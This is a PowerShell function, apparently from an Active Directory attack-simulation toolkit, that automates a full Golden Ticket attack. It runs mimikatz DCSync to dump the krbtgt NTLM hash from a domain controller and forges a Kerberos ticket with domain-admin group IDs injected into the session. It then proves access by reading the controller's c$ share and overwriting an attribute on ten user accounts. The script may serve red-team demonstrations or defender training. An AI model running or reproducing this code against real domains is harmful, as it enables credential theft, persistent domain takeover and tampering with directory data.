Function Invoke-GoldenTicket {

    ################################################################################
    #####                                                                      ##### 
    #####    Start a Golden Ticket Attack                                     #####                                 
    #####                                                                      #####
    ################################################################################

    $CurrentFunction = Get-FunctionName
    Write-Log -Message "### Start Function $CurrentFunction ###"
    $StartRunTime = (Get-Date).ToString($Script:DateFormatLog)
    #################### main code | out- host #####################

    $dn = Select-ADObject -DomainSelectionOnly -Title "Select Domain to get a Domain Controller for DPAPI Master Key Export"
    $fqdn = Convert-FromDNToCN -DistinguishedName $dn
    $server = Get-BestDomainController -domain $dn

    $temp = $Script:AllDomainsDetails | Where-Object { $_.DomainDN -match $dn } | Select-Object DomainFQDN, DomainSID, NetBIOSName

    $Script:ASDomainSID = $temp.DomainSID
    $Script:ASFQDN = $temp.DomainFQDN
    
    $KrbtgtName = "krbtgt"
    $KrbtgtSID = $Script:ASDomainSID + "-502"
    $KrbtgtAccount = $temp.NetBIOSName + "\" + $KrbtgtName
 
    $temp = Get-ADUserNameBasedOnRID -RID "-500" -Server $Script:ASFQDN
    $s500 = $temp.PadRight(24, [char]32)
    

    $sPrefix = Get-Date -Format HHmmss    # create the first name based on hours, minutes and sec
    $sSuffix = Get-Date -Format yyyyMMdd   # create the last name based on year, month, days
    $sFakeUser = "FU-$sSuffix.$sPrefix".PadRight(24, [char]32)
    $sBDUser = "$global:BDUser".PadRight(24, [char]32)

    $temp = Get-ASConfig -Setting "LastGTUser"
    $lastGTU = $temp.PadRight(24, [char]32)

    Invoke-output -Type Header -Message "Select an (fake) account for the Golden Ticket attack, for "

    Write-Host "     - the Administrator   $s500 enter:   " -NoNewline; Write-Host "A"-ForegroundColor Yellow
    Write-Host "     - the Fake User       $sFakeUser enter:   " -NoNewline; Write-Host "F"-ForegroundColor Yellow
    Write-Host "     - the previous User   $lastGTU enter:   " -NoNewline; Write-Host "P"-ForegroundColor Yellow


    $title = "Select an (fake) account for the Golden Ticket attack."
    $message = "Enter your choice!"

    $Options = @(
        [pscustomobject] @{ Label = "&Built-in Administrator"; Help = "the RID -500 account"; Value = "B" },
        [pscustomobject] @{ Label = "&Fake User"; Help = "Random Fake User account, based on current date and time"; Value = "F" },
        [pscustomobject] @{ Label = "&Previous User"; Help = "the previous Backdoor User account"; Value = "P" }
    )

    $answer = Show-DecisionPrompt -Message $message  -Options $Options -Default 1 -Title $title

    switch ($answer) {
        "B" { $temp = $s500; Break }
        "F" { $temp = $sFakeUser; Break }
        Default { $temp = $lastGTU }
    }

    $sFakeUser = $temp.trim() 

    invoke-output -Type Textmaker -message "Selected Account:" -TM $sFakeUser
    Set-ASConfig -Setting "LastGTUser" -Value $sFakeUser

    If (-not $SkipClearHost) { Clear-Host }

    Invoke-Output -Type  Header -M " Step 1 of 3 | Dump the NTLM Hash for the 'krbtgt' account"
    Invoke-Output -Type CodeSnippet -Message "Command:"
    Write-Highlight -Text ".\mimikatz.exe ", """log .\", $sFakeUser, ".log", """ ""lsadump::", "dcsync", " /domain:", $Script:ASFQDN, " /user:", $KrbtgtAccount, """ ""exit"""   `
        -Color $fgcC, $fgcS, $fgcV, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcS
           
    $answer = show-decisionPrompt

    If ($answer -eq $Script:Yes) {
        Invoke-Command -ScriptBlock { & "$($Script:ASTools)\mimikatz.exe" "log $Script:DefautExfiltrationFolder\$sFakeUser.log" "lsadump::dcsync /domain:$Script:ASFQDN /dc:$server /user:$KrbtgtSID"  "exit" }
        #Invoke-Item "$Script:DefautExfiltrationFolder\$sFakeUser.log"
        
        [string]$result = get-content -path "$Script:DefautExfiltrationFolder\$sFakeUser.log" | Select-String 'Hash NTLM:'

        if (([string]::IsNullOrEmpty($result))  ) {
            Invoke-output -type Error -Message  "Failed receiving NTLM Hash for $KrbtgtAccount account"
        }
        else {
            $hash = $result.Replace(" ", "").Split(":")[-1]
            Invoke-output -type Success -Message "Identified NTLM Hash $hash for $KrbtgtAccount account"
            set-ASConfig -Setting "krbtgtntml" -Value $hash
        }
        
        if ($UnAttended) { Start-Sleep 2 } else { Pause }
    }

    If (-not $SkipClearHost) { Clear-Host }
    $Script:ASDomainSID = Get-ASConfig -Setting "DomainSID" 
    $Script:ASSearchBase = Get-ASConfig -Setting "MySearchBase"
    $Script:ASKrbtgtNtml = Get-ASConfig -Setting "krbtgtntml"
        
        
    Do {
        Invoke-Output -Type Header -Message "Step 2 of 3 | Forge a Golden Ticket"

        $question = " -> Is this NTLH HASH '$Script:ASKrbtgtNtml'  for '$KrbtgtAccount'  correct - Y or N? Default "
        $prompt = Get-Answer -question $question -defaultValue $Script:Yes
    
        if ($prompt -ne $Script:Yes) {
            $Script:ASKrbtgtNtml = Read-Host "Enter new NTML Hash for '$KrbtgtAccount'"
            Set-ASConfig -Setting "krbtgtntml" -Value $Script:ASKrbtgtNtml
        }
           
    } Until ($prompt -eq $Script:Yes)


    # example: .\mimikatz.exe "privilege::debug" "kerberos::purge" "kerberos::golden /domain:$Script:ASFQDN /sid:$Script:ASDomainSID /rc4:$Script:ASKrbtgtNtml /user:$sFakeUser /id:500 /groups:500, 501, 513, 512, 520, 518, 519 /ptt" "exit"

    #    $sFakeUser = "Administrator"
    Write-Host ""
    Write-Host      -NoNewline "  Command: "
    Write-Highlight -Text ".\mimikatz.exe ", """privilege::debug"" ""kerberos::purge"" ""kerberos::", "golden", " /domain:", $Script:ASFQDN, " /sid:", $Script:ASDomainSID, " /rc4:", $Script:ASKrbtgtNtml, " /user:", $sFakeUser, " /id:", "500", " /groups:", "500, 501, 513, 512, 520, 518, 519", " /ptt"" ""exit"""  `
        -Color $fgcC, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS
        
       
    $question = "Would you like to run this step - Y or N? Default "
    $answer = Get-Answer -question $question -defaultValue $Script:Yes
        
    If ($answer -eq $Script:Yes) {
            
        Invoke-Command -ScriptBlock { & "$($Script:ASTools)\mimikatz.exe" "log $Script:DefautExfiltrationFolder\$sFakeUser`GT.log" "privilege::debug" "kerberos::purge" "kerberos::golden /domain:$Script:ASFQDN /sid:$Script:ASDomainSID /rc4:$Script:ASKrbtgtNtml /user:$sFakeUser /id:500 /groups:500, 501, 513, 512, 520, 518, 519 /ptt" "exit" }
            
        [string]$result = get-content -path "$Script:DefautExfiltrationFolder\$sFakeUser`GT.log" | Select-String 'Golden ticket for'

        if (([string]::IsNullOrEmpty($result))  ) {
            Invoke-output -type Error -Message  "Failed to summit a Golden ticket for '$sFakeUser'."
        }
        else {
            #Golden ticket for 'FU-20260520.144200 @ WS19-CHILD01.WS19-ROOT.CORP' successfully submitted for current session
            Invoke-output -type Success -Message $result
        }
            
            
        Pause
        If (-not $SkipClearHost) { Clear-Host }
         
        
        invoke-output -type Header -message "Displays a list of currently cached Kerberos tickets"
        invoke-output -type CodeSnippet -message "Command:"

        Write-Highlight -Text ('      klist') -Color $fgcC
        Write-Host ""  
        #Pause
        Set-NewColorSchema -NewStage $Script:GoldenTicket
        $tickets = Get-KlistTicket
        $tickets | Format-Table TicketNumber, Client, Server, EncryptionType, EndTime -AutoSize
        Invoke-Output -Type Info -Message "Last Ticket"
        $tickets | Select-object -Last 1 | Format-List
        Write-Host ""
        Pause
            
        Set-NewColorSchema -NewStage $Script:InitialStart    
        If (-not $SkipClearHost) { Clear-Host }
        
        invoke-output -type Header -message "Step 3 of 3 | Test the Golden Ticket"
        #"Make some changes to the Domain to verify the Golden Ticket attack was successful"
        
        $passed = Test-AccessDirectory -directory "\\$server\c$\*.*"
        
        Get-ADUser -filter * -SearchBase $dn -server $server | Select-Object -first 10  | Set-ADUser -replace @{info = "Golden Ticket Attack - $sFakeUser was here" }
        get-ADUser -filter * -SearchBase $dn -server $server -Properties * | Select-Object sAMAccountName, whenChanged, Displayname, info | Select-Object -first 10 | Format-Table
        
        
        If ($passed) {
            Invoke-Output -Type Success -Message "Successfully accessed directory '\\$server\c$\*.*'."
        }
        else {
            Invoke-Output -Type Error -Message "Failed to access directory '\\$server\c$\*.*'."
        }

        Pause
    }


    ######################## main code ############################
    $runtime = Get-RunTime -StartRunTime $StartRunTime
    Write-Log -Message "    Run Time: $runtime [h] ###"
    Write-Log -Message "### End Function $CurrentFunction ###"
}
